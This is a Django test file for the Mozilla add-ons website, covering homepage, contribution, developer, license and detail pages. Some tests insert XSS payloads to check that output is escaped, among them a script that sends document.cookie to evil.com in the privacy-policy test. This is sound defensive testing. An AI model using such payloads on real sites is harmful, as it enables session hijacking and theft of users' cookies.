# -*- coding: utf-8 -*-
from datetime import datetime, timedelta
from decimal import Decimal
import json
import re

from django import test
from django.conf import settings
from django.core import mail
from django.core.cache import cache
from django.test.client import Client

from mock import patch
from pyquery import PyQuery as pq

from olympia import amo
from olympia.amo.tests import ESTestCase, TestCase
from olympia.amo.helpers import numberfmt, urlparams
from olympia.amo.tests import addon_factory
from olympia.amo.urlresolvers import reverse
from olympia.addons.utils import generate_addon_guid
from olympia.abuse.models import AbuseReport
from olympia.addons.models import (
    Addon, AddonDependency, AddonFeatureCompatibility, AddonUser, Charity,
    Persona)
from olympia.bandwagon.models import Collection
from olympia.paypal.tests.test import other_error
from olympia.stats.models import Contribution
from olympia.users.helpers import users_list
from olympia.users.models import UserProfile
from olympia.versions.models import ApplicationsVersions, AppVersion, Version


def norm(s):
    """Normalize a string so that whitespace is uniform and remove whitespace
    between tags."""
    s = re.sub(r'\s+', ' ', str(s)).strip()
    return re.sub(r'>\s+<', '><', s)


def add_addon_author(original, copy):
    """Make both add-ons share an author."""
    author = original.listed_authors[0]
    AddonUser.objects.create(addon=copy, user=author, listed=True)
    return author


def check_cat_sidebar(url, addon):
    """Ensures that the sidebar shows the categories for the correct type."""
    cache.clear()
    for type_ in [amo.ADDON_EXTENSION, amo.ADDON_THEME, amo.ADDON_SEARCH]:
        addon.update(type=type_)
        r = Client().get(url)
        assert pq(r.content)('#side-nav').attr('data-addontype') == str(type_)


def _test_hovercards(self, doc, addons, src=''):
    addons = list(addons)
    assert doc.find('.addon.hovercard').length == len(addons)
    for addon in addons:
        btn = doc.find('.install[data-addon="%s"]' % addon.id)
        assert btn.length == 1
        hc = btn.parents('.addon.hovercard')
        assert hc.find('a').attr('href') == (
            urlparams(addon.get_url_path(), src=src))
        assert hc.find('h3').text() == unicode(addon.name)


class TestHomepage(TestCase):

    def setUp(self):
        super(TestHomepage, self).setUp()
        self.base_url = reverse('home')

    def test_304(self):
        self.url = '/en-US/firefox/'
        response = self.client.get(self.url)
        assert 'ETag' in response

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH=response['ETag'])
        assert response.status_code == 304
        assert not response.content

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH='random_etag_string')
        assert response.status_code == 200
        assert response.content

    def test_thunderbird(self):
        """Thunderbird homepage should have the Thunderbird title."""
        r = self.client.get('/en-US/thunderbird/')
        doc = pq(r.content)
        assert 'Add-ons for Thunderbird' == doc('title').text()

    def test_welcome_msg(self):
        r = self.client.get('/en-US/firefox/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        assert welcome.text() == (
            'Welcome to Firefox Add-ons. Choose from thousands of extra '
            'features and styles to make Firefox your own.')
        r = self.client.get('/en-US/thunderbird/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        assert welcome.text() == (
            'Welcome to Thunderbird Add-ons. Add extra features and styles to '
            'make Thunderbird your own.')


class TestHomepageFeatures(TestCase):
    fixtures = ['base/appversion',
                'base/users',
                'base/addon_3615',
                'base/collections',
                'base/global-stats',
                'base/featured',
                'addons/featured',
                'bandwagon/featured_collections']

    def setUp(self):
        super(TestHomepageFeatures, self).setUp()
        self.url = reverse('home')

    def test_no_unreviewed(self):
        response = self.client.get(self.url)
        addon_lists = 'popular featured hotness personas'.split()
        for key in addon_lists:
            for addon in response.context[key]:
                assert addon.status != amo.STATUS_UNREVIEWED

    def test_seeall(self):
        Collection.objects.update(type=amo.COLLECTION_FEATURED)
        doc = pq(self.client.get(self.url).content)
        browse_extensions = reverse('browse.extensions')
        browse_personas = reverse('browse.personas')
        browse_collections = reverse('collections.list')
        sections = {
            '#popular-extensions': browse_extensions + '?sort=users',
            '#featured-extensions': browse_extensions + '?sort=featured',
            '#upandcoming': browse_extensions + '?sort=hotness',
            '#featured-themes': browse_personas,
            '#featured-collections': browse_collections + '?sort=featured',
        }
        for id_, url in sections.iteritems():
            # Check that the "See All" link points to the correct page.
            assert doc.find('%s .seeall' % id_).attr('href') == url

    @amo.tests.mobile_test
    def test_mobile_home_extensions_only(self):
        r = self.client.get(self.url)
        addons = r.context['featured'] + r.context['popular']
        assert all([a.type == amo.ADDON_EXTENSION for a in addons]), (
            'Expected only extensions to be listed on mobile homepage')

    @amo.tests.mobile_test
    def test_mobile_home_featured(self):
        r = self.client.get(self.url)
        featured = r.context['featured']
        assert all([a.is_featured(amo.FIREFOX, 'en-US') for a in featured]), (
            'Expected only featured extensions to be listed under Featured')

    @amo.tests.mobile_test
    def test_mobile_home_popular(self):
        r = self.client.get(self.url)
        popular = r.context['popular']
        assert [a.id for a in popular] == (
            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
                                  reverse=True)])


class TestPromobox(TestCase):
    fixtures = ['addons/ptbr-promobox']

    def test_promo_box_ptbr(self):
        # bug 564355, we were trying to match pt-BR and pt-br
        response = self.client.get('/pt-BR/firefox/', follow=True)
        assert response.status_code == 200


class TestContributeInstalled(TestCase):
    fixtures = ['base/appversion', 'base/addon_592']

    def setUp(self):
        super(TestContributeInstalled, self).setUp()
        self.addon = Addon.objects.get(pk=592)
        self.url = reverse('addons.installed', args=['a592'])

    def test_no_header_block(self):
        # bug 565493, Port post-install contributions page
        response = self.client.get(self.url, follow=True)
        doc = pq(response.content)
        header = doc('#header')
        aux_header = doc('#aux-nav')
        # assert that header and aux_header are empty (don't exist)
        assert header == []
        assert aux_header == []

    def test_num_addons_link(self):
        r = self.client.get(self.url)
        a = pq(r.content)('.num-addons a')
        assert a.length == 1
        author = self.addon.authors.all()[0]
        assert a.attr('href') == author.get_url_path()

    def test_title(self):
        r = self.client.get(self.url)
        title = pq(r.content)('title').text()
        assert title.startswith('Thank you for installing Gmail S/MIME')


class TestContributeEmbedded(TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592', 'base/users']

    def setUp(self):
        super(TestContributeEmbedded, self).setUp()
        self.addon = Addon.objects.get(pk=592)
        self.detail_url = self.addon.get_url_path()

    @patch('olympia.paypal.get_paykey')
    def client_post(self, get_paykey, **kwargs):
        get_paykey.return_value = ['abc', '']
        url = reverse('addons.contribute', args=kwargs.pop('rev'))
        if 'qs' in kwargs:
            url = url + kwargs.pop('qs')
        return self.client.post(url, kwargs.get('data', {}))

    def test_client_get(self):
        url = reverse('addons.contribute', args=[self.addon.slug])
        assert self.client.get(url, {}).status_code == 405

    def test_invalid_is_404(self):
        """we get a 404 in case of invalid addon id"""
        response = self.client_post(rev=[1])
        assert response.status_code == 404

    @patch('olympia.paypal.get_paykey')
    def test_charity_name(self, get_paykey):
        get_paykey.return_value = ('payKey', 'paymentExecStatus')
        self.addon.charity = Charity.objects.create(name=u'foë')
        self.addon.name = u'foë'
        self.addon.save()
        url = reverse('addons.contribute', args=['a592'])
        self.client.post(url)

    def test_params_common(self):
        """Test for the some of the common values"""
        response = self.client_post(rev=['a592'])
        assert response.status_code == 302
        con = Contribution.objects.all()[0]
        assert con.charity_id is None
        assert con.addon_id == 592
        assert con.amount == Decimal('20.00')

    def test_custom_amount(self):
        """Test that we have the custom amount when given."""
        response = self.client_post(rev=['a592'], data={'onetime-amount': 42,
                                                        'type': 'onetime'})
        assert response.status_code == 302
        assert Contribution.objects.all()[0].amount == Decimal('42.00')

    def test_invalid_amount(self):
        response = self.client_post(rev=['a592'], data={'onetime-amount': 'f',
                                                        'type': 'onetime'})
        data = json.loads(response.content)
        assert data['paykey'] == ''
        assert data['error'] == 'Invalid data.'

    def test_amount_length(self):
        response = self.client_post(rev=['a592'], data={'onetime-amount': '0',
                                                        'type': 'onetime'})
        data = json.loads(response.content)
        assert data['paykey'] == ''
        assert data['error'] == 'Invalid data.'

    def test_ppal_json_switch(self):
        response = self.client_post(rev=['a592'], qs='?result_type=json')
        assert response.status_code == 200
        response = self.client_post(rev=['a592'])
        assert response.status_code == 302

    def test_ppal_return_url_not_relative(self):
        response = self.client_post(rev=['a592'], qs='?result_type=json')
        assert json.loads(response.content)['url'].startswith('http')

    def test_unicode_comment(self):
        res = self.client_post(rev=['a592'], data={'comment': u'版本历史记录'})
        assert res.status_code == 302
        assert settings.PAYPAL_FLOW_URL in res._headers['location'][1]
        assert Contribution.objects.all()[0].comment == u'版本历史记录'

    def test_comment_too_long(self):
        response = self.client_post(rev=['a592'], data={'comment': u'a' * 256})

        data = json.loads(response.content)
        assert data['paykey'] == ''
        assert data['error'] == 'Invalid data.'

    def test_organization(self):
        c = Charity.objects.create(name='moz', url='moz.com',
                                   paypal='test@moz.com')
        self.addon.update(charity=c)

        r = self.client_post(rev=['a592'])
        assert r.status_code == 302
        assert self.addon.charity_id == (
            self.addon.contribution_set.all()[0].charity_id)

    def test_no_org(self):
        r = self.client_post(rev=['a592'])
        assert r.status_code == 302
        assert self.addon.contribution_set.all()[0].charity_id is None

    def test_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client_post(rev=['a592'])
        assert res.status_code == 302
        assert settings.DEFAULT_SUGGESTED_CONTRIBUTION == (
            self.addon.contribution_set.all()[0].amount)

    def test_form_suggested_amount(self):
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        assert len(doc('#contribute-box input[type=radio]')) == 2

    def test_form_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        assert len(doc('#contribute-box input[type=radio]')) == 1

    @patch('olympia.paypal.get_paykey')
    def test_paypal_error_json(self, get_paykey):
        get_paykey.return_value = (None, None)
        res = self.contribute()
        assert not json.loads(res.content)['paykey']

    @patch('olympia.paypal.requests.post')
    def test_paypal_other_error_json(self, post):
        post.return_value.text = other_error
        res = self.contribute()
        assert not json.loads(res.content)['paykey']

    def _test_result_page(self):
        url = self.addon.get_detail_url('paypal', ['complete'])
        doc = pq(self.client.get(url, {'uuid': 'ballin'}).content)
        assert doc('#paypal-result').length == 1
        assert doc('#paypal-thanks').length == 0

    def test_addons_result_page(self):
        self._test_result_page()

    @patch('olympia.paypal.get_paykey')
    def test_not_split(self, get_paykey):
        get_paykey.return_value = ('payKey', 'paymentExecStatus')
        self.contribute()
        assert 'amount' in get_paykey.call_args[0][0]
        assert 'chains' not in get_paykey.call_args[0][0]

    def contribute(self):
        url = reverse('addons.contribute', args=[self.addon.slug])
        return self.client.post(urlparams(url, result_type='json'))


class TestDeveloperPages(TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592',
                'base/users', 'addons/eula+contrib-addon',
                'addons/addon_228106_info+dev+bio.json',
                'addons/addon_228107_multiple-devs.json']

    def test_meet_the_dev_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        assert title.startswith('Meet the Gmail S/MIME Developer')

    def test_roadblock_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        assert title.startswith('Meet the Gmail S/MIME Developer')

    def test_meet_the_dev_src(self):
        r = self.client.get(reverse('addons.meet', args=['a11730']))
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=developers')

    def test_nl2br_info(self):
        r = self.client.get(reverse('addons.meet', args=['a228106']))
        assert r.status_code == 200
        doc = pq(r.content)
        assert doc('.bio').html() == (
            'Bio: This is line one.<br/><br/>This is line two')
        addon_reasons = doc('#about-addon p')
        assert addon_reasons.eq(0).html() == (
            'Why: This is line one.<br/><br/>This is line two')
        assert addon_reasons.eq(1).html() == (
            'Future: This is line one.<br/><br/>This is line two')

    def test_nl2br_info_for_multiple_devs(self):
        # Get an Add-on that has multiple developers,
        # which will trigger the else block in the template.
        r = self.client.get(reverse('addons.meet', args=['a228107']))
        assert r.status_code == 200
        bios = pq(r.content)('.bio')
        assert bios.eq(0).html() == (
            'Bio1: This is line one.<br/><br/>This is line two')
        assert bios.eq(1).html() == (
            'Bio2: This is line one.<br/><br/>This is line two')

    def test_roadblock_src(self):
        url = reverse('addons.roadblock', args=['a11730'])
        # If they end up at the roadblock we force roadblock on them
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=dp-btn-primary')

        # No previous source gets the roadblock page source
        r = self.client.get(url)
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=meetthedeveloper_roadblock')

    def test_roadblock_different(self):
        url = reverse('addons.roadblock', args=['a11730'])
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=dp-btn-primary')
        assert pq(r.content)('#contribute-box input[name=source]').val() == (
            'roadblock')

    def test_contribute_multiple_devs(self):
        a = Addon.objects.get(pk=592)
        u = UserProfile.objects.get(pk=999)
        AddonUser(addon=a, user=u).save()
        r = self.client.get(reverse('addons.meet', args=['a592']))
        assert pq(r.content)('#contribute-button').length == 1

    def test_get_old_version(self):
        url = reverse('addons.meet', args=['a11730'])
        r = self.client.get(url)
        assert r.context['version'].version == '20090521'

        r = self.client.get('%s?version=%s' % (url, '20080521'))
        assert r.context['version'].version == '20080521'

    def test_duplicate_version_number(self):
        qs = Version.objects.filter(addon=11730)
        qs.update(version='1.x')
        assert qs.count() == 2
        url = reverse('addons.meet', args=['a11730']) + '?version=1.x'
        r = self.client.get(url)
        assert r.context['version'].version == '1.x'

    def test_purified(self):
        addon = Addon.objects.get(pk=592)
        addon.the_reason = addon.the_future = '<b>foo</b>'
        addon.save()
        url = reverse('addons.meet', args=['592'])
        r = self.client.get(url, follow=True)
        assert pq(r.content)('#about-addon b').length == 2


class TestLicensePage(TestCase):
    fixtures = ['base/addon_3615']

    def setUp(self):
        super(TestLicensePage, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version

    def test_legacy_redirect(self):
        r = self.client.get('/versions/license/%s' % self.version.id,
                            follow=True)
        self.assert3xx(r, self.version.license_url(), 301)

    def test_explicit_version(self):
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.version

    def test_implicit_version(self):
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.addon.current_version

    def test_no_license(self):
        self.version.update(license=None)
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 404

    def test_no_version(self):
        self.addon.versions.all().delete()
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        assert r.status_code == 404

    def test_duplicate_version_number(self):
        Version.objects.create(addon=self.addon, version=self.version.version)
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        assert r.status_code == 200
        assert r.context['version'] == self.addon.current_version

    def test_cat_sidebar(self):
        check_cat_sidebar(reverse('addons.license', args=['a3615']),
                          self.addon)


class TestDetailPage(TestCase):
    fixtures = ['base/addon_3615',
                'base/users',
                'base/addon_59',
                'base/addon_4594_a9',
                'addons/listed',
                'addons/persona']
    firefox_ios_user_agents = [
        ('Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) '
         'AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 '
         'Safari/600.1.4'),
        ('Mozilla/5.0 (iPad; CPU iPhone OS 8_3 like Mac OS X) '
         'AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 '
         'Safari/600.1.4')
    ]

    def setUp(self):
        super(TestDetailPage, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()

    def test_304(self):
        response = self.client.get(self.url)
        assert 'ETag' in response

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH=response['ETag'])
        assert response.status_code == 304
        assert not response.content

        response = self.client.get(self.url,
                                   HTTP_IF_NONE_MATCH='random_etag_string')
        assert response.status_code == 200
        assert response.content

    def test_site_title(self):
        r = self.client.get(self.url)
        assert pq(r.content)('h1.site-title').text() == 'Add-ons'

    def test_addon_headings(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        assert doc('h2:first').text() == 'About this Add-on'
        assert doc('.metadata .home').text() == 'Add-on home page'

    def test_anonymous_extension(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        assert response.context['addon'].id == 3615

    def test_anonymous_persona(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert response.status_code == 200
        assert response.context['addon'].id == 15663

    def test_review_microdata_personas(self):
        a = Addon.objects.get(id=15663)
        a.name = '<script>alert("fff")</script>'
        a.save()
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        html = pq(response.content)('table caption').html()
        assert '&lt;script&gt;alert(&#34;fff&#34;)&lt;/script&gt;' in html
        assert '<script>' not in html

    def test_personas_context(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert 'review_form' in response.context
        assert 'reviews' in response.context
        assert 'get_replies' in response.context

    def test_unreviewed_robots(self):
        """Check that unreviewed add-ons do not get indexed."""
        url = self.addon.get_url_path()
        m = 'meta[content=noindex]'

        assert self.addon.status == amo.STATUS_PUBLIC
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert not doc(m)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)

        self.addon.update(status=amo.STATUS_UNREVIEWED)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert doc(m)

    def test_more_about(self):
        # Don't show more about box if there's nothing to populate it.
        self.addon.developer_comments_id = None
        self.addon.description_id = None
        self.addon.previews.all().delete()
        self.addon.save()

        r = self.client.get(self.url)
        doc = pq(r.content)

        assert doc('#more-about').length == 0
        assert doc('.article.userinput').length == 0

    def test_beta(self):
        """Test add-on with a beta channel."""
        def get_pq_content():
            return pq(self.client.get(self.url, follow=True).content)

        # Add a beta version and show it.
        mybetafile = self.addon.versions.all()[0].files.all()[0]
        mybetafile.status = amo.STATUS_BETA
        mybetafile.save()
        self.addon.update(status=amo.STATUS_PUBLIC)
        beta = get_pq_content()
        assert beta('#beta-channel').length == 1

        # Beta channel section should link to beta versions listing
        versions_url = reverse('addons.beta-versions', args=[self.addon.slug])
        assert beta('#beta-channel a.more-info').length == 1
        assert beta('#beta-channel a.more-info').attr('href') == versions_url

        # Now hide it.  Beta is only shown for STATUS_PUBLIC.
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        beta = get_pq_content()
        assert beta('#beta-channel').length == 0

    @amo.tests.mobile_test
    def test_unreviewed_disabled_button(self):
        self.addon.update(status=amo.STATUS_UNREVIEWED)
        r = self.client.get(self.url)
        doc = pq(r.content)
        assert doc('.button.add').length == 1
        assert doc('.button.disabled').length == 0

    def test_type_redirect(self):
        """
        If current add-on's type is unsupported by app, redirect to an
        app that supports it.
        """
        # Thunderbird can't do search engines
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = amo.THUNDERBIRD.short
        response = self.client.get(reverse('addons.detail', args=['a4594']),
                                   follow=False)
        assert response.status_code == 301
        assert response['Location'].find(amo.THUNDERBIRD.short) == -1
        assert (response['Location'].find(amo.FIREFOX.short) >= 0)

    def test_compatible_app_redirect(self):
        """
        For add-ons incompatible with the current app, redirect to one
        that's supported.
        """
        comp_app = self.addon.compatible_apps.keys()[0]
        not_comp_app = [a for a in amo.APP_USAGE
                        if a not in self.addon.compatible_apps.keys()][0]

        # no SeaMonkey version => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = not_comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        assert r.status_code == 301
        assert r['Location'].find(not_comp_app.short) == -1
        assert r['Location'].find(comp_app.short) >= 0

        # compatible app => 200
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = comp_app.short
        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
        assert r.status_code == 200

    def test_external_urls(self):
        """Check that external URLs are properly escaped."""
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc(
            'aside a.home[href^="%s"]' % settings.REDIRECT_URL).length == 1

    def test_no_privacy_policy(self):
        """Make sure privacy policy is not shown when not present."""
        self.addon.privacy_policy_id = None
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('.privacy-policy').length == 0

    def test_privacy_policy(self):
        self.addon.privacy_policy = 'foo bar'
        self.addon.save()
        response = self.client.get(self.url)
        doc = pq(response.content)
        assert doc('.privacy-policy').length == 1
        privacy_url = reverse('addons.privacy', args=[self.addon.slug])
        assert doc('.privacy-policy').attr('href').endswith(privacy_url)

    def test_simple_html_is_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        assert norm(doc(".policy-statement strong")) == (
            "<strong> what the hell..</strong>")
        assert norm(doc(".policy-statement ul")) == (
            "<ul><li>papparapara</li><li>todotodotodo</li></ul>")
        assert doc(".policy-statement ol a").text() == (
            "firefox")
        assert norm(doc(".policy-statement ol li:first")) == (
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered_in_privacy(self):
        self.addon.privacy_policy = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        self.addon.save()

        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
            '<div class="policy-statement">&lt;script'), (
                'Unexpected: %s' % policy[0:50])

    def test_button_size(self):
        """Make sure install buttons on the detail page are prominent."""
        response = self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        assert pq(response.content)('.button').hasClass('prominent')

    def test_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        assert (pq(r.content)('#addon .button').attr(
            'href').endswith('?src=dp-btn-primary'))

    def test_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        assert (pq(r.content)('#addon .button').attr(
            'href').endswith('?src=trickleortreat'))

    def test_version_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        assert (pq(r.content)('#detail-relnotes .button').attr(
            'href').endswith('?src=dp-btn-version'))

    def test_version_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        assert (pq(r.content)('#detail-relnotes .button').attr(
            'href').endswith('?src=trickleortreat'))

    def test_version_more_link(self):
        doc = pq(self.client.get(self.url).content)
        versions_url = reverse('addons.versions', args=[self.addon.slug])
        assert (doc('#detail-relnotes a.more-info').attr('href') ==
                versions_url)

    def test_invalid_version(self):
        """Only render details pages for add-ons that have a version."""
        # Wipe all versions.
        self.addon.versions.all().delete()
        # Try accessing the details page.
        response = self.client.get(self.url)
        assert response.status_code == 404

    def test_no_listed_authors(self):
        r = self.client.get(reverse('addons.detail', args=['a59']))
        # We shouldn't show an avatar since this has no listed_authors.
        doc = pq(r.content)
        assert 0 == len(doc('.avatar'))

    def test_authors_xss(self):
        name = '<script>alert(1)</script>'
        user = UserProfile.objects.create(username='test',
                                          display_name=name)

        output = users_list([user])

        assert "&lt;script&gt;alert" in output
        assert "<script>alert" not in output

    def test_display_compatible_apps(self):
        """
        Show compatibility info for extensions but not for search engines.
        """
        r = self.client.get(self.addon.get_url_path())
        assert pq(r.content)('#detail-relnotes .compat').length == 1

        a = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
        r = self.client.get(a.get_url_path())
        assert pq(r.content)('#detail-relnotes .compat').length == 0

    def test_show_profile(self):
        selector = '.author a[href="%s"]' % self.addon.meet_the_dev_url()

        assert not (self.addon.the_reason or self.addon.the_future)
        assert not pq(self.client.get(self.url).content)(selector)

        self.addon.the_reason = self.addon.the_future = '...'
        self.addon.save()
        assert pq(self.client.get(self.url).content)(selector)

    def test_no_restart(self):
        no_restart = '<span class="no-restart">No Restart</span>'
        f = self.addon.current_version.all_files[0]

        assert not f.no_restart
        r = self.client.get(self.url)
        assert no_restart not in r.content

        f.no_restart = True
        f.save()
        r = self.client.get(self.url)
        self.assertContains(r, no_restart)

    def test_disabled_user_message(self):
        self.addon.update(disabled_by_user=True)
        res = self.client.get(self.url)
        assert res.status_code == 404
        assert 'removed by its author' in res.content

    def test_disabled_status_message(self):
        self.addon.update(status=amo.STATUS_DISABLED)
        res = self.client.get(self.url)
        assert res.status_code == 404
        assert 'disabled by an administrator' in res.content

    def test_deleted_status_message(self):
        addon = Addon.objects.get(id=3615)
        addon.update(status=amo.STATUS_DELETED)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
        assert res.status_code == 404

    def test_more_url(self):
        response = self.client.get(self.url)
        assert pq(response.content)('#more-webpage').attr('data-more-url') == (
            self.addon.get_url_path(more=True))

    def test_unlisted_addon_returns_404(self):
        """Unlisted addons are not listed and return 404."""
        self.addon.update(is_listed=False)
        assert self.client.get(self.url).status_code == 404

    def test_fx_ios_addons_message(self):
        c = Client(HTTP_USER_AGENT=self.firefox_ios_user_agents[0])
        r = c.get(self.url)
        addons_banner = pq(r.content)('.get-fx-message')
        banner_message = ('Add-ons are not currently available on Firefox for '
                          'iOS.')
        assert addons_banner.text() == banner_message


class TestImpalaDetailPage(TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592', 'base/users']

    def setUp(self):
        super(TestImpalaDetailPage, self).setUp()
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()
        self.more_url = self.addon.get_url_path(more=True)

    def get_pq(self):
        return pq(self.client.get(self.url).content)

    def test_adu_stats_private(self):
        assert not self.addon.public_stats
        adu = self.get_pq()('#daily-users')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_adu_stats_public(self):
        self.addon.update(public_stats=True)
        assert self.addon.show_adu()
        adu = self.get_pq()('#daily-users')

        # Check that ADU does link to public statistics dashboard.
        assert adu.find('a').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        assert adu.text().split()[0] == numberfmt(
            self.addon.average_daily_users)

        # Check if we hide link when there are no ADU.
        self.addon.update(average_daily_users=0)
        assert self.get_pq()('#daily-users').length == 0

    def test_adu_stats_regular(self):
        self.client.login(username='regular@mozilla.com', password='password')
        # Should not be a link to statistics dashboard for regular users.
        adu = self.get_pq()('#daily-users')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_adu_stats_admin(self):
        self.client.login(username='del@icio.us', password='password')
        # Check link to statistics dashboard for add-on authors.
        assert self.get_pq()('#daily-users a.stats').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

    def test_downloads_stats_private(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        assert not self.addon.public_stats
        adu = self.get_pq()('#weekly-downloads')
        assert adu.length == 1
        assert adu.find('a').length == 0

    def test_downloads_stats_public(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        assert not self.addon.show_adu()
        dls = self.get_pq()('#weekly-downloads')

        # Check that weekly downloads links to statistics dashboard.
        assert dls.find('a').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

        # Check formatted count.
        assert dls.text().split()[0] == numberfmt(self.addon.weekly_downloads)

        # Check if we hide link when there are no weekly downloads.
        self.addon.update(weekly_downloads=0)
        assert self.get_pq()('#weekly-downloads').length == 0

    def test_downloads_stats_regular(self):
        self.addon.update(type=amo.ADDON_SEARCH)
        self.client.login(username='regular@mozilla.com', password='password')
        # Should not be a link to statistics dashboard for regular users.
        dls = self.get_pq()('#weekly-downloads')
        assert dls.length == 1
        assert dls.find('a').length == 0

    def test_downloads_stats_admin(self):
        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
        self.client.login(username='del@icio.us', password='password')
        # Check link to statistics dashboard for add-on authors.
        assert self.get_pq()('#weekly-downloads a.stats').attr('href') == (
            reverse('stats.overview', args=[self.addon.slug]))

    def test_dependencies(self):
        assert self.get_pq()('.dependencies').length == 0
        req = Addon.objects.get(id=592)
        AddonDependency.objects.create(addon=self.addon, dependent_addon=req)
        assert self.addon.all_dependencies == [req]
        cache.clear()
        d = self.get_pq()('.dependencies .hovercard')
        assert d.length == 1
        assert d.find('h3').text() == unicode(req.name)
        assert d.find('a').attr('href').endswith('?src=dp-dl-dependencies')
        assert d.find('.install-button a').attr('href').endswith(
            '?src=dp-hc-dependencies')

    def test_no_restart(self):
        f = self.addon.current_version.all_files[0]
        assert not f.no_restart
        assert self.get_pq()('.no-restart').length == 0
        f.update(no_restart=True)
        assert self.get_pq()('.no-restart').length == 1

    def test_license_link_builtin(self):
        g = 'http://google.com'
        version = self.addon._current_version
        license = version.license
        license.builtin = 1
        license.name = 'License to Kill'
        license.url = g
        license.save()
        assert license.builtin == 1
        assert license.url == g
        a = self.get_pq()('.secondary.metadata .source-license a')
        assert a.attr('href') == g
        assert a.text() == 'License to Kill'

    def test_license_link_custom(self):
        version = self.addon._current_version
        assert version.license.url is None
        a = self.get_pq()('.secondary.metadata .source-license a')
        assert a.attr('href') == version.license_url()
        assert a.attr('target') is None
        assert a.text() == 'Custom License'

    def get_more_pq(self):
        return pq(self.client.get_ajax(self.more_url).content)

    def test_other_addons(self):
        """Ensure listed add-ons by the same author show up."""
        other = Addon.objects.get(id=592)
        assert list(Addon.objects.listed(amo.FIREFOX).exclude(
            id=self.addon.id)) == [other]

        add_addon_author(other, self.addon)
        doc = self.get_more_pq()('#author-addons')
        _test_hovercards(self, doc, [other], src='dp-dl-othersby')

